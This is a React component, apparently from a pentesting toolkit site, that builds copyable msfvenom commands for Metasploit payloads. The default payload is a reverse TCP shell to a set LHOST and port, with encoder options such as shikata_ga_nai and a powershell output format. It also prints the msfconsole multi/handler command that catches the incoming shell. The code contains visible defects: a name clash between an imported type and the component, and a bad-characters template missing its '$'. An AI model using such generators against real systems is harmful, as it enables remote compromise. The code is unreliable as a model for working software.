import React from 'react';
import { Input, Typography, Row, Divider, Select, Form, Col, Collapse } from 'antd';
import PersistedState from 'use-persisted-state';
import { MSFBuilder } from 'components/types/MSFBuilder';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph } = Typography;

const MSFBuilder = () => {
    // LocalStorage stuff
    const msfVenomBuilder = PersistedState<MSFBuilder>( 'msfVenomBuilder' );

    // Antd stuff
    const { Option } = Select;
    const { Panel } = Collapse;
    const { Text } = Typography;

    let payloads = require( '../../assets/data/Payloads.json' );
    let encoder = require( '../../assets/data/Encoder.json' );
    let platform = require( '../../assets/data/Platform.json' );
    let format = require( '../../assets/data/Format.json' );

    const [ values, setValues ] = msfVenomBuilder( {
        Payload: 'generic/shell_reverse_tcp',
        LHOST: '10.10.13.37',
        LPORT: '4444',
        Encoder: '',
        EncoderIterations: '',
        Platform: '',
        Arch: '',
        NOP: '',
        BadCharacters: '',
        Format: '',
        Outfile: ''
    } );

    const launchCommand = `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${ values.Payload }; set LHOST ${ values.LHOST }; set LPORT ${ values.LPORT }; run"`;

    const handleChange = ( name: string ) => ( event: { target: { value: string } } ) => {
        setValues( { ...values, [ name ]: event.target.value } );
    };

    const handleChangeSelect = ( prop: string ) => ( data: any ) => {
        setValues( { ...values, [ prop ]: data } );
    };

    return (
        <QueueAnim delay={300} duration={1500}>
            <div style={{ margin: 15 }}>
                <Title level={2} style={{ fontWeight: 'bold' }}>
                    MSF Venom Builder
                </Title>
                <Paragraph>
                    Msfvenom is a command line instance of Metasploit that is used to generate and output all of the
                    various types of shell code that are available in Metasploit.
                </Paragraph>
            </div>
            <Divider dashed />
            <div
                key='a'
                style={{
                    marginTop: 15,
                    marginLeft: 15
                }}
            >
                <Form>
                    <Form.Item name='payload' valuePropName={values.Payload} required label='Payload'>
                        <Select
                            showSearch
                            options={payloads}
                            value={values.Payload}
                            allowClear
                            onChange={handleChangeSelect( 'Payload' )}
                            placeholder='python/meterpreter/reverse_http'
                            filterOption={( inputValue, option ) =>
                                option.value.toLowerCase().indexOf( inputValue.toLowerCase() ) >= 0}
                        >
                            {payloads.map(
                                (
                                    data: {
                                        value:
                                        | boolean
                                        | React.ReactChild
                                        | React.ReactFragment
                                        | React.ReactPortal
                                        | null
                                        | undefined;
                                    },
                                    key: string | number
                                ) => {
                                    return <Option value={key}>{data.value}</Option>;
                                }
                            )}
                        </Select>
                    </Form.Item>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={12}>
                            <Form.Item required name='ip_address' valuePropName={values.LHOST} label='LHOST'>
                                <Input
                                    value={values.LHOST}
                                    onChange={handleChange( 'LHOST' )}
                                    maxLength={15}
                                    allowClear
                                    placeholder='IP Address or domain (ex: 212.212.111.222)'
                                />
                            </Form.Item>
                        </Col>
                        <Col span={12}>
                            <Form.Item required name='port' valuePropName={values.LPORT} label='LPORT'>
                                <Input
                                    value={values.LPORT}
                                    onChange={handleChange( 'LPORT' )}
                                    maxLength={5}
                                    allowClear
                                    placeholder='Port (ex: 1337)'
                                />
                            </Form.Item>
                        </Col>
                    </Row>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={12}>
                            <Form.Item name='encoder' valuePropName={values.Encoder} label='Encoder'>
                                <Select
                                    showSearch
                                    options={encoder}
                                    value={values.Encoder}
                                    onChange={handleChangeSelect( 'Encoder' )}
                                    placeholder='x86/shikata_ga_nai'
                                    allowClear
                                    filterOption={( inputValue, option: any ) =>
                                        option.value.toUpperCase().indexOf( inputValue.toUpperCase() ) !== -1}
                                >
                                    {encoder.map(
                                        (
                                            data: {
                                                value:
                                                | boolean
                                                | React.ReactChild
                                                | React.ReactFragment
                                                | React.ReactPortal
                                                | null
                                                | undefined;
                                            },
                                            key: string | number
                                        ) => {
                                            return <Option value={key}>{data.value}</Option>;
                                        }
                                    )}
                                </Select>
                            </Form.Item>
                        </Col>
                        <Col span={12}>
                            <Form.Item name='iteration' valuePropName={values.EncoderIterations} label='Iterations'>
                                <Input
                                    value={values.EncoderIterations}
                                    onChange={handleChange( 'EncoderIterations' )}
                                    placeholder='4'
                                    allowClear
                                />
                            </Form.Item>
                        </Col>
                    </Row>
                    <Form.Item name='badchar' valuePropName={values.BadCharacters} label='Bad Characters'>
                        <Input
                            value={values.BadCharacters}
                            onChange={handleChange( 'BadCharacters' )}
                            placeholder='\x00\x0a\x0d'
                            allowClear
                        />
                    </Form.Item>
                </Form>
                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                    <Col span={12}>
                        <Form.Item valuePropName={values.Platform} name='platform' label='Platform'>
                            <Select
                                showSearch
                                options={platform}
                                value={values.Platform}
                                onChange={handleChangeSelect( 'Platform' )}
                                placeholder='Windows'
                                allowClear
                                filterOption={( inputValue, option: any ) =>
                                    option.value.toUpperCase().indexOf( inputValue.toUpperCase() ) !== -1}
                            >
                                {platform.map(
                                    (
                                        data: {
                                            value: boolean | React.ReactChild | React.ReactFragment | React.ReactPortal;
                                        },
                                        key: string | number
                                    ) => {
                                        return <Option value={key}>{data.value}</Option>;
                                    }
                                )}
                            </Select>
                        </Form.Item>
                    </Col>
                    <Col span={12}>
                        <Form.Item valuePropName={values.Arch} name='architecture' label='Architecture'>
                            <Select
                                showSearch
                                value={values.Arch}
                                onChange={handleChangeSelect( 'Arch' )}
                                placeholder='x86'
                                allowClear
                            >
                                <Option value={'x64'}>x64</Option>
                                <Option value={'x86'}>x86</Option>
                            </Select>
                        </Form.Item>
                    </Col>
                </Row>
                <Form.Item name='nop' valuePropName={values.NOP} label='Nop&#39;s'>
                    <Input
                        value={values.NOP}
                        allowClear
                        onChange={handleChange( 'NOP' )}
                        maxLength={5}
                        placeholder='200'
                    />
                </Form.Item>
                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                    <Col span={9}>
                        <Form.Item valuePropName={values.Format} name='format' label='Format'>
                            <Select
                                showSearch
                                options={format}
                                value={values.Format}
                                onChange={handleChangeSelect( 'Format' )}
                                placeholder='powershell'
                                allowClear
                                filterOption={( inputValue, option: any ) =>
                                    option.value.toUpperCase().indexOf( inputValue.toUpperCase() ) !== -1}
                            >
                                {format.map(
                                    (
                                        data: {
                                            value:
                                            | boolean
                                            | React.ReactChild
                                            | React.ReactFragment
                                            | React.ReactPortal
                                            | null
                                            | undefined;
                                        },
                                        key: string | number
                                    ) => {
                                        return <Option value={key}>{data.value}</Option>;
                                    }
                                )}
                            </Select>
                        </Form.Item>
                    </Col>
                    <Col span={15}>
                        <Form.Item valuePropName={values.Outfile} name='outfile' label='Output File'>
                            <Input
                                value={values.Outfile}
                                onChange={handleChange( 'Outfile' )}
                                placeholder='reverse_shell'
                                allowClear
                            />
                        </Form.Item>
                    </Col>
                </Row>
                <Collapse defaultActiveKey={[ '1' ]} ghost>
                    <Panel header='MSF Venom Command' key='1'>
                        <Paragraph>
                            <pre>
                                <Text copyable>
                                    msfvenom -p {values.Payload}
                                    {values.LHOST > '' && ' LHOST=' + values.LHOST}
                                    {values.LPORT > '' && ' LPORT=' + values.LPORT}
                                    {values.Platform > '' && ' --platform ' + values.Platform}
                                    {values.Arch > '' && ' -a ' + values.Arch}
                                    {values.NOP > '' && ' -n ' + values.NOP}
                                    {values.Encoder > '' && ' -e ' + values.Encoder}
                                    {values.EncoderIterations > '' && ' -i ' + values.EncoderIterations}
                                    {values.BadCharacters > '' && ' -b ' + `"{values.BadCharacters}"`}
                                    {values.Format > '' && ' -f ' + values.Format}
                                    {values.Outfile > '' && ' -o ' + values.Outfile}
                                </Text>
                            </pre>
                        </Paragraph>
                    </Panel>
                    <Panel header='Launch Console & Load Handler' key='2'>
                        <Paragraph>
                            <pre>
                                <Text copyable>{launchCommand}</Text>
                            </pre>
                        </Paragraph>
                    </Panel>
                    <Panel header='Load Handler Only' key='3'>
                        <Paragraph>
                            <pre>
                                <Text copyable>
                                    {`use exploit/multi/handler
set PAYLOAD ${ values.Payload }
set LHOST ${ values.LHOST }
set LPORT ${ values.LPORT }
run`}
                                </Text>
                            </pre>
                        </Paragraph>
                    </Panel>
                </Collapse>
            </div>
        </QueueAnim>
    );
};

export default MSFBuilder;
